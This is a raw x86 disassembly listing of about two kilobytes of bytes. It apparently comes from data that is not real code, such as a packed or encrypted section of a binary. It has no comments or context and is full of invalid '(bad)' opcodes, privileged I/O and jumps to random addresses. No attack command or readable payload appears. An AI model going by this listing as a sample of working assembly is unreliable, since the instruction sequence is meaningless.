  422e53:	loopne 0x422e3d
  422e55:	dec    eax
  422e56:	fisttp DWORD PTR [ebp+0x45]
  422e59:	mov    ebp,0x286c02ce
  422e5e:	mov    ebp,DWORD PTR [edi+0x7f]
  422e61:	mov    eax,0xccef02b
  422e66:	xchg   ebp,eax
  422e67:	mov    cl,0x71
  422e69:	dec    ch
  422e6b:	mov    edx,0xab566cb4
  422e70:	jmp    DWORD PTR [esi]
  422e72:	aas    
  422e73:	cmp    BYTE PTR [edx],cl
  422e75:	inc    edi
  422e76:	mov    dh,bl
  422e78:	sub    eax,0xcc731684
  422e7d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422e7e:	daa    
  422e7f:	and    eax,0xaa77f6f4
  422e84:	push   esp
  422e85:	xor    al,0x70
  422e87:	jo     0x422e1b
  422e89:	enter  0x6a18,0x63
  422e8d:	in     eax,0xc2
  422e8f:	stos   DWORD PTR es:[edi],eax
  422e90:	sbb    dl,BYTE PTR cs:[edx-0x3c]
  422e94:	mov    al,ds:0x328c88e3
  422e99:	sti    
  422e9a:	and    eax,0x579e0d34
  422e9f:	add    BYTE PTR [ebx+0x9],cl
  422ea2:	ja     0x422ea4
  422ea4:	lods   eax,DWORD PTR ds:[esi]
  422ea5:	shr    BYTE PTR [esi],1
  422ea7:	retf   0xe3c2
  422eaa:	sub    BYTE PTR [ebp-0x47],0xd0
  422eae:	and    BYTE PTR [eax],al
  422eb0:	sub    al,0xe0
  422eb2:	test   DWORD PTR [eax-0x1c],0xed1c48ba
  422eb9:	inc    ebx
  422eba:	(bad)  
  422ebb:	xchg   esp,eax
  422ebc:	int3   
  422ebd:	out    dx,al
  422ebe:	pop    esp
  422ebf:	shl    BYTE PTR [edi+edx*4+0x5997bd48],0x62
  422ec7:	jbe    0x422e9f
  422ec9:	add    eax,0xba888768
  422ece:	add    bl,bl
  422ed0:	sub    DWORD PTR [ecx+0x3a98f07e],ecx
  422ed6:	jge    0x422f1f
  422ed8:	pop    edx
  422ed9:	loopne 0x422f3c
  422edb:	inc    esp
  422edc:	dec    edi
  422edd:	stos   BYTE PTR es:[edi],al
  422ede:	pop    edx
  422edf:	test   eax,0x85073523
  422ee4:	push   edx
  422ee5:	xchg   edx,eax
  422ee6:	xchg   edi,eax
  422ee7:	or     BYTE PTR [ecx],bh
  422ee9:	cli    
  422eea:	in     al,0x14
  422eec:	idiv   BYTE PTR [eax+0x42d12476]
  422ef2:	pushw  0xffab
  422ef5:	sti    
  422ef6:	add    edx,DWORD PTR [esp+eax*8]
  422ef9:	nop
  422efa:	das    
  422efb:	(bad)  
  422efc:	iret   
  422efd:	in     eax,dx
  422efe:	daa    
  422eff:	cld    
  422f00:	fiadd  DWORD PTR [ebp-0x2c]
  422f03:	or     BYTE PTR [edi+0x67],cl
  422f06:	push   edx
  422f07:	sti    
  422f08:	xor    BYTE PTR [eax+0x2c287e75],dh
  422f0e:	out    dx,al
  422f0f:	pop    edx
  422f10:	retf   
  422f11:	imul   esp,ebx,0x13
  422f14:	sub    eax,0xd363f4b6
  422f19:	jle    0x422f15
  422f1b:	push   0x44896887
  422f20:	add    eax,0xaf7fd77b
  422f25:	lock leave 
  422f27:	cli    
  422f28:	xor    ecx,0xffffffb5
  422f2b:	pop    esp
  422f2c:	sub    edx,edi
  422f2e:	hlt    
  422f2f:	popf   
  422f30:	inc    esi
  422f31:	(bad)  
  422f32:	cli    
  422f33:	ds mov dh,0xf9
  422f36:	out    0x77,al
  422f38:	aad    0x55
  422f3a:	mov    edx,0x6c2d9aca
  422f3f:	(bad)  
  422f40:	test   al,0x90
  422f42:	xchg   esp,eax
  422f43:	jno    0x422f8a
  422f45:	push   cs
  422f46:	xchg   esp,eax
  422f47:	cmp    al,0x5e
  422f49:	cli    
  422f4a:	repz jle 0x422f97
  422f4d:	das    
  422f4e:	adc    edx,edx
  422f50:	lods   eax,DWORD PTR ds:[esi]
  422f51:	xor    edx,DWORD PTR [esp+ebp*1]
  422f54:	pop    ebp
  422f55:	(bad)  
  422f56:	xor    al,0x6d
  422f58:	xchg   ebx,eax
  422f59:	xor    bh,cl
  422f5b:	xchg   ebx,eax
  422f5c:	jl     0x422f4c
  422f5e:	inc    eax
  422f5f:	int    0x65
  422f61:	mov    ah,0x80
  422f63:	gs call 0xff595917
  422f69:	sub    cl,bl
  422f6b:	cli    
  422f6c:	xchg   esp,eax
  422f6d:	stc    
  422f6e:	in     al,0x0
  422f70:	call   0x5c0b9e61
  422f75:	cli    
  422f76:	jo     0x422ef8
  422f78:	int3   
  422f79:	out    dx,al
  422f7a:	in     al,0x75
  422f7c:	leave  
  422f7d:	mov    edi,esi
  422f7f:	in     eax,0xce
  422f81:	(bad)  [esi*4-0x2c0693cc]
  422f88:	imul   edi,DWORD PTR [edx+0x1d],0xffffff95
  422f8c:	pop    ds
  422f8d:	xchg   ebp,eax
  422f8e:	push   ds
  422f8f:	or     DWORD PTR [ebx-0x43],0xd23f09f4
  422f96:	xchg   edi,eax
  422f97:	ja     0x422f61
  422f99:	lods   eax,DWORD PTR ds:[esi]
  422f9a:	jl     0x422fc5
  422f9c:	pop    eax
  422f9d:	ja     0x422ff0
  422f9f:	pop    es
  422fa0:	mov    al,0xea
  422fa2:	es scas eax,DWORD PTR es:[edi]
  422fa4:	add    eax,DWORD PTR [ebx-0x67]
  422fa7:	xchg   bh,bh
  422fa9:	mov    ecx,0x7f5fb95f
  422fae:	xchg   ebp,eax
  422faf:	out    0x48,eax
  422fb1:	aad    0x25
  422fb3:	cmp    eax,0x8b31c7c
  422fb8:	xor    ebx,DWORD PTR [edi+0x77]
  422fbb:	push   ebp
  422fbc:	fisubr WORD PTR [esi-0x3c875371]
  422fc2:	mov    al,ds:0x3ce00fd8
  422fc7:	sub    dh,BYTE PTR [edx]
  422fc9:	xlat   BYTE PTR ds:[ebx]
  422fca:	sahf   
  422fcb:	dec    esp
  422fcc:	sbb    eax,DWORD PTR [ecx+0x10]
  422fcf:	jo     0x42303e
  422fd1:	(bad)  
  422fd2:	dec    ebx
  422fd3:	adc    DWORD PTR [edi],eax
  422fd5:	aad    0x12
  422fd7:	fld    QWORD PTR [esp+edx*2+0x23]
  422fdb:	popf   
  422fdc:	add    BYTE PTR gs:[eax],al
  422fdf:	add    BYTE PTR [eax],al
  422fe1:	add    BYTE PTR [edi],cl
  422fe3:	pop    ebx
  422fe4:	test   BYTE PTR [esi],dl
  422fe6:	aam    0xdf
  422fe8:	lahf   
  422fe9:	pop    ebx
  422fea:	dec    ebp
  422feb:	sar    ebx,cl
  422fed:	adc    esi,DWORD PTR [esi]
  422fef:	jp     0x423001
  422ff1:	cld    
  422ff2:	dec    edx
  422ff3:	test   eax,0x4f30001
  422ff8:	add    BYTE PTR [eax],al
  422ffa:	xchg   ah,ch
  422ffc:	and    al,0x63
  422ffe:	or     al,BYTE PTR [eax-0x69]
  423001:	int    0xde
  423003:	xlat   BYTE PTR ds:[ebx]
  423004:	mov    cl,0x88
  423006:	mov    cl,0xe
  423008:	push   esi
  423009:	inc    esp
  42300a:	sub    DWORD PTR [edi-0x42c8ef80],ebp
  423010:	lahf   
  423011:	(bad)  
  423012:	aam    0xd5
  423014:	mov    eax,ds:0x36f9549a
  423019:	retf   
  42301a:	jmp    0x2e51:0x93f82a60
  423021:	or     DWORD PTR [esi],ecx
  423023:	mov    eax,0x4a5d3863
  423028:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  42302a:	in     eax,0x79
  42302c:	fcomp  QWORD PTR ds:[eax+0x669fd580]
  423033:	ffreep st(7)
  423035:	aam    0x47
  423037:	cli    
  423038:	pop    es
  423039:	dec    ebp
  42303a:	push   esi
  42303b:	mov    ss,esi
  42303d:	sub    DWORD PTR ds:0x783b2700,esi
  423043:	sub    al,BYTE PTR [ecx+0x4e609ae6]
  423049:	xchg   BYTE PTR [ebp+esi*8-0x46],al
  42304d:	popa   
  42304e:	pop    eax
  42304f:	jmp    0x422fe5
  423051:	ins    BYTE PTR es:[edi],dx
  423052:	mov    ds,WORD PTR [ebx+0x16cf40a1]
  423058:	mov    al,ds:0xcfaa08f1
  42305d:	fcmove st,st(6)
  42305f:	cmp    DWORD PTR [esi],ecx
  423061:	nop
  423062:	mov    ecx,0xc6c8c1ed
  423067:	cli    
  423068:	jge    0x423095
  42306a:	imul   esi,DWORD PTR [esi],0x8ca43fd2
  423070:	mov    eax,0xf8ddf96a
  423075:	pop    ebx
  423076:	arpl   sp,dx
  423078:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423079:	sbb    BYTE PTR [edi-0x4eaa681e],bl
  42307f:	sbb    DWORD PTR [edi+edx*2],esp
  423082:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423083:	xchg   BYTE PTR [ebx+0x14],ch
  423086:	js     0x4230a6
  423088:	fidivr DWORD PTR [ecx-0x22f52249]
  42308e:	aas    
  42308f:	or     edx,DWORD PTR [ebx+0x45]
  423092:	popf   
  423093:	outs   dx,DWORD PTR ds:[esi]
  423094:	scas   al,BYTE PTR es:[edi]
  423095:	js     0x4230d2
  423097:	xlat   BYTE PTR ds:[ebx]
  423098:	rcl    esi,cl
  42309a:	sub    edi,eax
  42309c:	push   ss
  42309d:	xchg   esp,eax
  42309e:	add    DWORD PTR fs:[ebp-0x2e],edi
  4230a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4230a3:	push   ecx
  4230a4:	imul   edi,ebx,0x5c
  4230a7:	jmp    0x4230d5
  4230a9:	in     eax,0xe
  4230ab:	mov    bl,cl
  4230ad:	jp     0x423052
  4230af:	xor    DWORD PTR [ecx-0x7e],edi
  4230b2:	bound  edx,QWORD PTR [ecx-0x19]
  4230b5:	dec    esi
  4230b6:	jg     0x423077
  4230b8:	dec    ebx
  4230b9:	mov    ebx,0x87c46ba5
  4230be:	xor    al,0xa8
  4230c0:	lods   al,BYTE PTR ds:[esi]
  4230c1:	jmp    0x4230bb
  4230c3:	inc    edi
  4230c4:	xchg   esp,eax
  4230c5:	and    ch,BYTE PTR [eax+ecx*8+0x116d60af]
  4230cc:	jecxz  0x42305b
  4230ce:	jne    0x4230d4
  4230d0:	push   ecx
  4230d1:	(bad)  
  4230d2:	pop    edi
  4230d3:	jmp    0xbc6a:0x72c12d3
  4230da:	and    al,0xb5
  4230dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4230dd:	adc    DWORD PTR gs:[ecx+0x28],esp
  4230e1:	data16 jb 0x42313f
  4230e4:	dec    eax
  4230e5:	adc    dh,BYTE PTR [eax-0x1d668d3e]
  4230eb:	pop    edx
  4230ec:	cmp    al,0x79
  4230ee:	pop    ds
  4230ef:	push   0xffffffab
  4230f1:	adc    eax,0xcfcd887f
  4230f6:	iret   
  4230f7:	std    
  4230f8:	neg    BYTE PTR [edi+edx*2+0x50]
  4230fc:	pop    ecx
  4230fd:	xor    ebx,ebp
  4230ff:	dec    esi
  423100:	clc    
  423101:	jl     0x423175
  423103:	cld    
  423104:	inc    ebp
  423105:	sbb    al,0xb
  423107:	rcl    BYTE PTR [eax],cl
  423109:	icebp  
  42310a:	fbld   TBYTE PTR [edi+0x29]
  42310d:	and    edx,ecx
  42310f:	lea    edi,[ecx]
  423111:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423112:	inc    esp
  423113:	mov    eax,ds:0xd4b758b6
  423118:	(bad)
  42311b:	dec    edi
  42311c:	(bad)  
  42311d:	in     eax,dx
  42311e:	fsub   QWORD PTR [ebx-0x2c]
  423121:	dec    esp
  423122:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423123:	cdq    
  423124:	inc    edi
  423125:	popa   
  423126:	mov    dh,0x92
  423128:	cmp    esp,DWORD PTR [esi+0x3]
  42312b:	mov    eax,0x86f729c3
  423130:	cmp    ch,BYTE PTR [ecx+ebp*8+0x79ef3b78]
  423137:	adc    al,0x1c
  423139:	out    0xc3,eax
  42313b:	dec    edi
  42313c:	pop    esi
  42313d:	or     DWORD PTR cs:[ebx+0x582f2779],ebx
  423144:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423145:	push   0x3f6bb986
  42314a:	xor    DWORD PTR [esi-0xa],esi
  42314d:	fidiv  DWORD PTR gs:[esi+ecx*4-0x176cde99]
  423155:	dec    esi
  423156:	pop    esp
  423157:	je     0x423142
  423159:	out    dx,al
  42315a:	jle    0x423115
  42315c:	(bad)  
  42315d:	cmc    
  42315e:	ret    0x4ed7
  423161:	outs   dx,BYTE PTR ds:[esi]
  423162:	pop    edx
  423163:	std    
  423164:	sub    eax,edi
  423166:	fcomp  st(4)
  423168:	add    al,0xe7
  42316a:	or     DWORD PTR [edi-0x352aa9a9],eax
  423170:	and    al,0x14
  423172:	cmp    dh,BYTE PTR [ebp+0x2eef1463]
  423178:	sbb    dl,BYTE PTR [esi+eiz*4-0x4d840715]
  42317f:	cmp    BYTE PTR [ecx],dh
  423181:	mov    eax,0xca1144ac
  423186:	fcmovbe st,st(3)
  423188:	sbb    DWORD PTR [eax+0x60f97962],esp
  42318e:	test   eax,0x9d627c28
  423193:	inc    edi
  423194:	enter  0xc7a3,0x3a
  423198:	add    DWORD PTR [eax+0x74],0x24
  42319c:	fild   QWORD PTR [edi]
  42319e:	push   edx
  42319f:	ss xor edi,ebx
  4231a2:	pushf  
  4231a3:	fs jmp 0xf2f769f3
  4231a9:	lahf   
  4231aa:	mov    edi,0xbb0c9a32
  4231af:	push   ds
  4231b0:	push   ds
  4231b1:	jmp    0xf331:0x8eeb3f71
  4231b8:	or     esi,edi
  4231ba:	stc    
  4231bb:	sub    al,0x5b
  4231bd:	adc    BYTE PTR [eax+0x4018fff1],ah
  4231c3:	pop    ebx
  4231c4:	cmp    DWORD PTR [esi],0xad77b164
  4231ca:	mov    ah,0x6d
  4231cc:	pop    esi
  4231cd:	in     eax,dx
  4231ce:	cmp    DWORD PTR [edi+0x33689e56],0x907c9fbb
  4231d8:	xchg   edi,eax
  4231d9:	and    eax,0x8e42e1ff
  4231de:	adc    eax,0x65e25982
  4231e3:	jmp    0x4231c6
  4231e5:	call   0xd304:0x2b89d305
  4231ec:	jne    0x423234
  4231ee:	mov    edi,?
  4231f0:	(bad)  
  4231f1:	fisttp DWORD PTR [ebx+ebx*2-0x482c0690]
  4231f8:	pusha  
  4231f9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4231fa:	sar    DWORD PTR [ebx+0x61],cl
  4231fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4231fe:	cmp    cl,BYTE PTR [ebx]
  423200:	(bad)  
  423201:	fwait
  423202:	popa   
  423203:	mov    eax,0xc60220ce
  423208:	xor    eax,0xb2fadd6a
  42320d:	pop    ecx
  42320e:	sbb    edi,esi
  423210:	add    cl,BYTE PTR ds:0xc5a6b93c
  423216:	(bad)  
  423217:	pop    ebx
  423218:	ss je  0x423214
  42321b:	inc    esi
  42321c:	loope  0x4231d4
  42321e:	pop    edi
  42321f:	mov    cl,0xbb
  423221:	inc    ebp
  423222:	xchg   esi,eax
  423223:	ins    BYTE PTR es:[edi],dx
  423224:	daa    
  423225:	ror    BYTE PTR [edx],cl
  423227:	add    al,0xc5
  423229:	rcl    DWORD PTR [ebx+0x54],1
  42322c:	aad    0xfa
  42322e:	jmp    0x4232a5
  423230:	add    al,BYTE PTR [edi+0xd]
  423233:	cmp    eax,0x1c1162e4
  423238:	nop
  423239:	or     DWORD PTR [edi-0x4f],ecx
  42323c:	pop    ds
  42323d:	mov    al,0x72
  42323f:	or     eax,DWORD PTR [esi+0x76c335fc]
  423245:	inc    edx
  423246:	call   0x174a52fe
  42324b:	lods   al,BYTE PTR ds:[esi]
  42324c:	call   0xd8b26908
  423251:	adc    esp,DWORD PTR [esp+edx*1]
  423254:	cdq    
  423255:	test   ecx,eax
  423257:	test   eax,0x4fdc9bd7
  42325c:	ror    BYTE PTR [ecx+0x54bdd3b0],0xcd
  423263:	push   eax
  423264:	cld    
  423265:	sbb    eax,0xc75b2a62
  42326a:	call   0x4c3:0x9f60b0b9
  423271:	sub    eax,0xc20dfb79
  423276:	fwait
  423277:	dec    ebx
  423278:	jne    0x4232f7
  42327a:	scas   eax,DWORD PTR es:[edi]
  42327b:	xchg   ecx,eax
  42327c:	xor    bh,BYTE PTR [ecx+0x406b81c6]
  423282:	cmp    ah,BYTE PTR [eax]
  423284:	dec    ebx
  423285:	jle    0x5bbda4e
  42328b:	ja     0x423218
  42328d:	mov    DWORD PTR [edi],0x5ecae09d
  423293:	inc    esi
  423294:	jmp    0x65572b13
  423299:	jns    0x4232e6
  42329b:	pusha  
  42329c:	mov    gs,esp
  42329e:	and    DWORD PTR [esi],ecx
  4232a0:	out    dx,al
  4232a1:	cmp    al,0x9b
  4232a3:	not    BYTE PTR [edi]
  4232a5:	les    ecx,FWORD PTR [esi+0x459b8a0]
  4232ab:	add    al,0x94
  4232ad:	bswap  edx
  4232af:	iret   
  4232b0:	pop    ebx
  4232b1:	mul    BYTE PTR [ebx]
  4232b3:	mov    al,ds:0x2b3ad403
  4232b8:	repz cmp BYTE PTR [ebx+edi*4],al
  4232bc:	pop    edx
  4232bd:	adc    al,0x53
  4232bf:	(bad)
  4232c2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4232c3:	test   edx,ebx
  4232c5:	sar    BYTE PTR [ebx],1
  4232c7:	ins    BYTE PTR es:[edi],dx
  4232c8:	(bad)  
  4232c9:	jae    0x423273
  4232cb:	jne    0x423315
  4232cd:	dec    ecx
  4232ce:	call   0xbf82:0x68410144
  4232d5:	mov    edx,DWORD PTR [edx]
  4232d7:	leave  
  4232d8:	es sahf 
  4232da:	push   ds
  4232db:	retf   0xbd4d
  4232de:	pop    ebx
  4232df:	jno    0x42334b
  4232e1:	pop    es
  4232e2:	push   ebx
  4232e3:	lds    cx,DWORD PTR [ecx+ebx*1]
  4232e7:	ficom  DWORD PTR [ecx+edi*8]
  4232ea:	mov    ah,0x62
  4232ec:	push   ecx
  4232ed:	dec    esp
  4232ee:	mov    bl,0x50
  4232f0:	dec    esp
  4232f1:	and    esp,edx
  4232f3:	outs   dx,DWORD PTR ds:[esi]
  4232f4:	repnz stos DWORD PTR es:[edi],eax
  4232f6:	ror    DWORD PTR [ebp+0x4f],0xed
  4232fa:	imul   eax,esi,0xffffffce
  4232fd:	aam    0xf8
  4232ff:	adc    bh,BYTE PTR [ebx+0x63]
  423302:	xor    BYTE PTR [edx+0x61],bl
  423305:	jmp    0x4c69c33
  42330a:	(bad)  
  42330b:	push   ecx
  42330c:	(bad)  
  42330d:	jmp    0x20f2498
  423312:	xor    edi,edi
  423314:	mov    eax,0xa7c892ca
  423319:	dec    ebx
  42331a:	sbb    DWORD PTR [ecx+0x64a42d93],esp
  423320:	(bad)  
  423321:	mov    ebx,0x4963f39c
  423326:	aas    
  423327:	jle    0x423333
  423329:	leave  
  42332a:	aad    0xfe
  42332c:	lgs    ebx,FWORD PTR [ecx+ebp*1-0x286ac465]
  423334:	shl    DWORD PTR [ecx],cl
  423336:	aaa    
  423337:	out    dx,al
  423338:	retw   
  42333a:	jnp    0x4232d4
  42333c:	aas    
  42333d:	mov    edx,esi
  42333f:	sub    bl,BYTE PTR [edi+0x16]
  423342:	cld    
  423343:	popf   
  423344:	dec    edx
  423345:	lea    ebx,[ecx+0x14]
  423348:	jno    0x423381
  42334a:	punpckhdq mm4,QWORD PTR [eax+edx*8+0x46d6d426]
  423352:	lods   eax,DWORD PTR ds:[esi]
  423353:	mov    ebx,0x5fb42ad7
  423358:	mov    DWORD PTR [ebp-0x46],eax
  42335b:	aam    0x53
  42335d:	inc    esp
  42335e:	xchg   ebx,eax
  42335f:	and    al,0x5f
  423361:	hlt    
  423362:	outs   dx,BYTE PTR ds:[esi]
  423363:	mov    cl,0x46
  423365:	test   eax,0x7c27668e
  42336a:	loop   0x423372
  42336c:	lea    ecx,[eax-0x45fc7304]
  423372:	inc    edi
  423373:	sub    DWORD PTR [ebx-0x159c03fd],0x59c43456
  42337d:	xlat   BYTE PTR ds:[ebx]
  42337e:	leave  
  42337f:	sbb    esp,DWORD PTR [ebx-0x1e54afb]
  423385:	lock cmp BYTE PTR [edi],0xca
  423389:	test   al,0xac
  42338b:	mov    al,ds:0x30d1c534
  423390:	pop    DWORD PTR [edx-0x79]
  423393:	shl    ebp,cl
  423395:	dec    edx
  423396:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423397:	mov    bh,0x9c
  423399:	push   0x51
  42339b:	push   cs
  42339c:	out    0xb7,al
  42339e:	(bad)  
  42339f:	adc    al,0xfe
  4233a1:	sub    DWORD PTR [ecx],ecx
  4233a3:	bound  esp,QWORD PTR [esp+edx*4-0x8]
  4233a7:	xor    esp,DWORD PTR [eax]
  4233a9:	pushf  
  4233aa:	or     al,0x74
  4233ac:	(bad)
  4233b1:	jns    0x423345
  4233b3:	jno    0x4233b0
  4233b5:	jle    0x423384
  4233b7:	mov    esi,0x39f4d3cc
  4233bc:	aam    0xa
  4233be:	sbb    ebx,DWORD PTR [esi]
  4233c0:	in     eax,0xb7
  4233c2:	mov    ds:0xfd2b5798,al
  4233c7:	addr16 xchg ebp,eax
  4233c9:	rcr    BYTE PTR [ecx+0x4a],1
  4233cc:	xchg   esp,eax
  4233cd:	sbb    BYTE PTR [eax+0xe0af213],cl
  4233d3:	sbb    eax,0x601aa1e3
  4233d8:	push   cs
  4233d9:	mov    edi,0xf65ae969
  4233de:	fs pop ss
  4233e0:	ror    DWORD PTR [esi+0x28],0x47
  4233e4:	dec    eax
  4233e5:	cli    
  4233e6:	imul   esp,DWORD PTR [eax+ecx*8+0xcb631],0xffffffb6
  4233ee:	test   DWORD PTR [edx-0xb],edx
  4233f1:	in     al,dx
  4233f2:	sub    BYTE PTR [ebp-0x2f],dh
  4233f5:	adc    al,0x6
  4233f7:	xchg   esi,eax
  4233f8:	mov    DWORD PTR [esi-0x58],edi
  4233fb:	out    0x79,eax
  4233fd:	cs adc al,0xcd
  423400:	enter  0x878,0x46
  423404:	cmp    DWORD PTR [eax],0xfc5bd475
  42340a:	imul   edx,ebx,0x2f
  42340d:	rol    BYTE PTR [edx],1
  42340f:	mov    eax,ds:0xd037ca57
  423414:	sub    eax,0x83f63553
  423419:	or     bl,BYTE PTR [ebx+0x4590ce63]
  42341f:	and    al,0x11
  423421:	imul   ebx,DWORD PTR [edi-0x6],0x2609a02
  423428:	jp     0x42348d
  42342a:	pop    edi
  42342b:	lea    edx,[esi]
  42342d:	dec    edi
  42342e:	jae    0x4233cb
  423430:	outs   dx,DWORD PTR ds:[esi]
  423431:	aas    
  423432:	mov    ds:0xde3bfc2d,eax
  423437:	cmp    bl,bh
  423439:	mov    ecx,0xb5276a0c
  42343e:	repnz inc edx
  423440:	in     al,0xd
  423442:	pop    ebp
  423443:	std    
  423444:	inc    edx
  423445:	fcmovne st,st(0)
  423447:	sbb    BYTE PTR [ecx+0x2],al
  42344a:	lods   eax,DWORD PTR ds:[esi]
  42344b:	popf   
  42344c:	mul    BYTE PTR [esi]
  42344e:	retf   0x65ae
  423451:	mov    eax,ds:0xcef92dd6
  423456:	ds call 0xb5ee:0x664fe528
  42345e:	ins    BYTE PTR es:[edi],dx
  42345f:	xlat   BYTE PTR ds:[ebx]
  423460:	dec    ebx
  423461:	pop    edi
  423462:	aad    0xb7
  423464:	push   0x45
  423466:	(bad)  
  423467:	int    0x21
  423469:	mov    bh,0x60
  42346b:	pushf  
  42346c:	aas    
  42346d:	lock pop ebp
  42346f:	ds aam 0x27
  423472:	clc    
  423473:	seta   BYTE PTR [esi]
  423476:	dec    esp
  423477:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423478:	pop    esp
  423479:	shl    DWORD PTR [esi-0x70],1
  42347c:	sub    ah,BYTE PTR [edi]
  42347e:	jns    0x4234c7
  423480:	adc    eax,0x679f4ef
  423485:	(bad)  [edx-0x63a48176]
  42348b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42348c:	loop   0x4234d1
  42348e:	xchg   edi,eax
  42348f:	(bad)  
  423490:	and    BYTE PTR [edi-0x5ca5b436],bh
  423496:	mov    eax,0xf7361b6d
  42349b:	lahf   
  42349c:	in     eax,dx
  42349d:	loopne 0x423502
  42349f:	out    0x4f,al
  4234a1:	mov    esi,0x44df52fb
  4234a6:	adc    BYTE PTR [ebp+0x47],0x9
  4234aa:	adc    al,0xfb
  4234ac:	push   0x269ee1d6
  4234b1:	dec    esi
  4234b2:	ja     0x42347a
  4234b4:	in     al,0x9
  4234b6:	xchg   edx,eax
  4234b7:	stos   DWORD PTR es:[edi],eax
  4234b8:	inc    ebp
  4234b9:	inc    esp
  4234ba:	inc    eax
  4234bb:	test   al,0xcd
  4234bd:	sub    BYTE PTR [ebx-0x54],0x3e
  4234c1:	(bad)  
  4234c2:	push   esp
  4234c3:	loop   0x423491
  4234c5:	loop   0x42347f
  4234c7:	add    eax,0xac3f4ede
  4234cc:	arpl   WORD PTR [ecx+0x49],dx
  4234cf:	and    esi,DWORD PTR [edi-0x5a]
  4234d2:	neg    BYTE PTR [eax+0x662905b2]
  4234d8:	or     BYTE PTR [edx-0x754003b7],0x53
  4234df:	adc    eax,esi
  4234e1:	out    0xc5,al
  4234e3:	sti    
  4234e4:	dec    edi
  4234e5:	test   al,0x9
  4234e7:	fsub   DWORD PTR [edi-0x11]
  4234ea:	lods   al,BYTE PTR ds:[esi]
  4234eb:	xchg   edx,eax
  4234ec:	push   ebp
  4234ed:	add    BYTE PTR [eax],al
  4234ef:	add    BYTE PTR [eax],al
  4234f1:	add    BYTE PTR [ecx-0x5d],cl
  4234f4:	push   ebp
  4234f5:	(bad)  
  4234f6:	push   esi
  4234f8:	retf   
  4234f9:	mov    edi,0x3f1d56c2
  4234fe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4234ff:	inc    ebp
  423500:	or     eax,0x1ae3d9a
  423505:	add    bl,dh
  423507:	add    al,0x0
  423509:	add    BYTE PTR [edi-0x173c1336],bh
  42350f:	ficomp DWORD PTR [edx-0x5e]
  423512:	ja     0x4234d3
  423514:	sub    DWORD PTR [eax],0xffffff97
  423517:	popf   
  423518:	inc    esi
  423519:	fild   WORD PTR [ebp+0x24cc6ea1]
  42351f:	lods   al,BYTE PTR ds:[esi]
  423520:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423521:	gs push ebx
  423523:	inc    ebp
  423524:	sbb    BYTE PTR [ecx+0x5c],bh
  423527:	ror    DWORD PTR [bx+si],1
  42352a:	xor    ebx,DWORD PTR [ebp-0x3f]
  42352d:	add    DWORD PTR ds:0x9256ee89,0xaf6464fb
  423537:	mov    bh,0x20
  423539:	hlt    
  42353a:	xchg   edi,eax
  42353b:	mov    eax,0x270bda59
  423540:	mov    BYTE PTR [edx+0x5d9561eb],bl
  423546:	out    dx,al
  423547:	dec    eax
  423548:	sbb    dl,BYTE PTR [esp+esi*8-0xe8216ed]
  42354f:	adc    eax,0x8c650251
  423554:	adc    DWORD PTR [eax+0x6a],ebx
  423557:	mov    dl,0x94
  423559:	fild   QWORD PTR [ecx-0x1a]
  42355c:	inc    DWORD PTR [ecx]
  42355e:	jmp    0x7ff0:0xcc414773
  423565:	or     WORD PTR [esi-0x4d52c8a9],bp
  42356c:	or     esp,DWORD PTR [ebx]
  42356e:	mov    eax,ds:0x2e5d3152
  423573:	sub    al,0xec
  423575:	out    dx,eax
  423576:	aaa    
  423577:	jmp    0x9f3a4e74
  42357c:	push   ds
  42357d:	cli    
  42357e:	mov    cl,0xd3
  423580:	and    ah,BYTE PTR [edi-0x10397fa2]
  423586:	jl     0x423547
  423588:	ja     0x423585
  42358a:	and    DWORD PTR [esi-0x7],eax
  42358d:	inc    ecx
  42358e:	test   eax,0x1b803294
  423593:	add    BYTE PTR [esi],al
  423595:	sbb    DWORD PTR [esi+0x2c],edx
  423598:	scas   al,BYTE PTR es:[edi]
  423599:	es je  0x423575
  42359c:	jg     0x4235c1
  42359e:	pusha  
  42359f:	out    dx,eax
  4235a0:	loopne 0x4235bd
  4235a2:	jae    0x42358a
  4235a4:	shr    BYTE PTR [ebx],0x76
  4235a7:	pop    edx
  4235a8:	bound  eax,QWORD PTR [eax-0x281fadc2]
  4235ae:	mov    cl,0x4c
  4235b0:	dec    ecx
  4235b1:	cmp    BYTE PTR [esi+0x4f],ah
  4235b4:	xchg   esp,eax
  4235b5:	mov    ebp,0x8c56e87e
  4235ba:	add    al,0x8b
  4235bc:	addr16 popa 
  4235be:	dec    ebp
  4235bf:	not    BYTE PTR ds:0x7fef6ca1
  4235c5:	ficomp DWORD PTR ds:0x2b5dcf82
  4235cb:	int    0x75
  4235cd:	xor    ebp,DWORD PTR [eax+0x38]
  4235d0:	mov    ecx,0xbb74aa2a
  4235d5:	xor    DWORD PTR [eax+0x23a18978],esi
  4235db:	xchg   ebp,eax
  4235dc:	jbe    0x423656
  4235de:	(bad)  
  4235df:	es xor al,0xc
  4235e2:	pop    edx
  4235e3:	mov    bl,0xbc
  4235e5:	sbb    al,0xdd
  4235e7:	sbb    al,bh
  4235e9:	push   ebp
  4235ea:	cs ins DWORD PTR es:[edi],dx
  4235ec:	jo     0x4235da
  4235ee:	pop    ds
  4235ef:	push   esi
  4235f0:	je     0x4235a6
  4235f2:	imul   esp,ecx,0xffffffdd
  4235f5:	neg    BYTE PTR [ecx]
  4235f7:	out    0x13,eax
  4235f9:	iret   
  4235fa:	loopne 0x42365e
  4235fc:	enter  0x7f04,0xd3
  423600:	repz mov WORD PTR [eax+0x6b6c41da],?
  423607:	pop    edi
  423608:	adc    al,0xfd
  42360a:	xchg   edx,eax
